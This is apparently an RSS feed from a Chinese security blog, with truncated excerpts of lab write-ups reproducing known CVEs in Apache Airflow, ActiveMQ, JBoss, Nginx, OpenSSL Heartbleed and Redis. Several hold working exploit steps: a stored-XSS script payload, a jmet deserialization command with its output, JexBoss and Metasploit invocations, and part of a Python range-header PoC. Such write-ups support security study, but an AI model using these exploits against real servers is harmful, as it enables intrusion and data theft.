<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>漏洞复现 on Atmet</title>
    <link>https://oopsdc.tk/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
    <description>Recent content in 漏洞复现 on Atmet</description>
    <image>
      <url>https://oopsdc.tk/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
      <link>https://oopsdc.tk/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
    </image>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Thu, 17 Jun 2021 09:03:30 +0800</lastBuildDate><atom:link href="https://oopsdc.tk/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>Apache漏洞复现</title>
      <link>https://oopsdc.tk/post/apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
      <pubDate>Thu, 17 Jun 2021 09:03:30 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/apache%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
      <description>Airflow 存储型XSS 漏洞描述 Apache Airflow 1.10.2及之前版本中的airflow webserver服务存在跨站脚本漏洞，漏洞源于WEB应用缺少对客户端数据的正确验证，攻击者可利用该漏洞执行客户端代码。
影响版本 Apache Airflow 1.10.3以下版本。
复现思路 漏洞复现 访问/admin/dagrun/(默认不需要密码)
创建一个项目，输入ID后点击保存，返回列表，点击running字样，发现能够输入HTML代码，例:
&amp;lt;script&amp;gt;_a=&amp;#34;https://www.baidu.com&amp;#34;&amp;lt;/script&amp;gt; &amp;lt;script&amp;gt;document.location=_a&amp;lt;/script&amp;gt; 能直接造成存储型XSS。
ActiveMQ 反序列化漏洞 CVE-2015-5254 漏洞描述 Apache ActiveMQ是Apache软件经济会研发的一套开源消息中间件，支持Java消息服务、集群、Spring Framework等。Apache ActiveMQ 5.13.0之前版本，即5.x版本中存在反序列化漏洞，该漏洞源于程序没有限制可在代理中序列化的类，攻击者可借助特制的序列化Java消息服务(JMS) ObjectMessage对象利用该漏洞执行任意代码。
影响版本 Apache ActiveMQ 5.13.0之前的5.x版本。
复现思路 1.构造(可使用ysoserial)可执行命令的序列化对象。
2.作为一个消息，发送给目标61616端口。
3.访问web管理页面，读取消息，触发漏洞。
漏洞复现 使用jmet进行漏洞利用:https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar
 下载好之后在jmet-0.1.0-all.jar同级目录下创建external文件夹，避免出现文件夹不存在的报错。
jmet的原理是使用jar包内置ysoserial生成Payload并发送，我们需要在ysoserial的gadget选择一个可使用的，如ROME。
 给目标ActiveMQ添加一个名为event的队列，点击事件为生成/tmp/vuln文件:
java -jar jmet-0.1.0-all.jar -Q event -I ActiveMQ -s -Y &amp;#34;touch /tmp/vuln&amp;#34; -Yp ROME &amp;lt;ip&amp;gt; 61616 # 命令执行成功后回显如下 INFO d.c.j.t.JMSTarget [main] Connected with ID: ID:&amp;lt;server-id&amp;gt; INFO d.c.j.t.JMSTarget [main] Sent gadget &amp;#34;ROME&amp;#34; with command: &amp;#34;touch /tmp/vuln&amp;#34; INFO d.</description>
    </item>
    
    <item>
      <title>JBoss漏洞复现</title>
      <link>https://oopsdc.tk/post/jboss%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
      <pubDate>Thu, 17 Jun 2021 09:03:30 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/jboss%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
      <description>JBoss 4.x JBossMQ JMS 反序列化漏洞 CVE-2017-7504 漏洞描述 Red Hat JBoss Application Server是一款基于JavaEE的开源应用服务器。JBoss AS 4.x及之前版本中，JBossMQ实现过程的JMS over HTTP Invocation Layer的HTTPServerILServlet.java文件存在反序列化漏洞，攻击者可借助特制的序列化数据利用该漏洞执行任意代码。
影响版本 JBoss AS 4.x及之前。
复现思路 漏洞复现 环境搭建:
git clone https://github.com/vulhub/vulhub.git cd vulhub/jboss/CVE-2017-7504 docker-compose up -d Jexboss工具:joaomatosf/jexboss: JexBoss: Jboss (and Java Deserialization Vulnerabilities) verify and EXploitation Tool (github.com)
git clone https://github.com/joaomatosf/jexboss.git python3 jexboss.py -host http://&amp;lt;ip&amp;gt;:8080 成功利用漏洞执行命令。
 本文链接:JBoss漏洞复现 | Atmet (oopsdc.tk)
文章许可:本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。
 </description>
    </item>
    
    <item>
      <title>Nginx漏洞复现</title>
      <link>https://oopsdc.tk/post/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
      <pubDate>Thu, 17 Jun 2021 09:03:30 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/nginx%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
      <description>Nginx 越界读取缓存漏洞 CVE-2017-7529 漏洞描述 Nginx在反向代理站点的时候，通常会缓存一些文件，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括文件头+HTTP返回包头+HTTP返回包体。如果二次请求命中该缓存文件，Nginx会直接将该文件中的HTTP返回包体返回给用户。
如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能读取到缓存文件中位于HTTP返回包体前的文件头、HTTP返回包头等内容。
影响版本 Nginx 0.5.6 ~ 1.13.2
复现思路 漏洞复现 环境搭建:
git clone https://github.com/vulhub/vulhub.git cd vulhub/nginx/CVE-2017-7529 docker-compose up -d 访问:http://&amp;lt;ip&amp;gt;:8080正常即可。
POC已经在当前目录中给出来，文件名poc.py:
#!/usr/bin/env python import sys import requests if len(sys.argv) &amp;lt; 2: print(&amp;#34;%surl&amp;#34; % (sys.argv[0])) print(&amp;#34;eg: python %shttp://your-ip:8080/&amp;#34; % (sys.argv[0])) sys.exit() headers = { &amp;#39;User-Agent&amp;#39;: &amp;#34;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&amp;#34; } offset = 605 url = sys.argv[1] file_len = len(requests.get(url, headers=headers).content) n = file_len + offset headers[&amp;#39;Range&amp;#39;] = &amp;#34;bytes=-%d,-%d&amp;#34; % ( n, 0x8000000000000000 - n) r = requests.</description>
    </item>
    
    <item>
      <title>服务器应用漏洞</title>
      <link>https://oopsdc.tk/post/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/</link>
      <pubDate>Thu, 17 Jun 2021 09:03:30 +0800</pubDate>
      
      <guid>https://oopsdc.tk/post/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/</guid>
      <description>OpenSSL OpenSSL 心脏滴血漏洞 CVE-2014-0160 漏洞描述 2014年4月7日，OpenSSL发布安全公告，在OpenSSL 1.0.1 ~ 1.0.1f Beta1版本中存在漏洞，漏洞名为HeartBleed。其中Heart是指该漏洞位于心跳协议上，Bleed是因为该漏洞会造成数据泄露。即HeartBleed是在心跳协议上的一个数据泄露漏洞，OpenSSL库中用到了该心跳协议。
影响版本 OpenSSL 1.0.1、1.0.1a、1.0.1b、1.0.1c、1.0.1d、1.0.1e、1.0.1f、Beta 1 of OpenSSL 1.0.2等。
复现思路 漏洞复现 环境搭建:
git clone https://github.com/vulhub/vulhub.git cd vulhub/openssl/heartbleed docker-compose up -d 使用msf对目标进行攻击:
msfconsole set RHOST &amp;lt;ip&amp;gt; set verbose true run Redis Redis 主从复制RCE 漏洞描述 在2019年7月7日结束的WCTF2019 Final上，LC/BC成员Pavel Toporkov在分享会上介绍了一种关于Redis新版本的RCE利用方式，比起以前的利用方式来说，这种利用方式更为通用，危害也更大。
Pavel Toporkov的分享:
15-redis-post-exploitation.pdf (zeronights.ru)
影响版本 Redis &amp;lt;= 5.0.5
复现思路 漏洞复现 环境搭建:
docker pull a1143535418/redis5.0 docker run -p 6379:6379 -d a1143535418/redis5.0 redis-server 利用脚本:
n0b0dyCN/redis-rogue-server: Redis(&amp;lt;=5.0.5) RCE (github.com)</description>
    </item>
    
  </channel>
</rss>
